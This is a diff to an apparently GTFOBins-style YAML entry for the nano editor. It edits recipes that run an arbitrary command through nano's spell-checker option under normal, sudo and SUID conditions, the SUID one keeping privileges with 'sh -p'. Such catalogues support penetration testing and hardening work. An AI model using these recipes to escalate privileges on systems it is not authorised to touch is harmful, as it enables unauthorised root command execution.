@@ -7,7 +7,7 @@ functions:
         TF=$(mktemp)
         echo "$COMMAND" > $TF
         chmod +x $TF
-        nano -s $TF
+        nano -s $TF /etc/hosts
         ^T
   sudo-enabled:
     - description: After running this exit the editor to see the command output.
@@ -16,7 +16,7 @@ functions:
         TF=$(mktemp)
         echo "$COMMAND" > $TF
         chmod +x $TF
-        sudo nano -s $TF
+        sudo nano -s $TF /etc/hosts
         ^T
   suid-enabled:
     - description: After running this exit the editor to see the command output.
@@ -25,7 +25,7 @@ functions:
         TF=$(mktemp)
         echo $'#!/bin/sh -p\n'"$COMMAND" > $TF
         chmod +x $TF
-        ./nano -s $TF
+        ./nano -s $TF /etc/hosts
         ^T
   file-read:
     - code: |
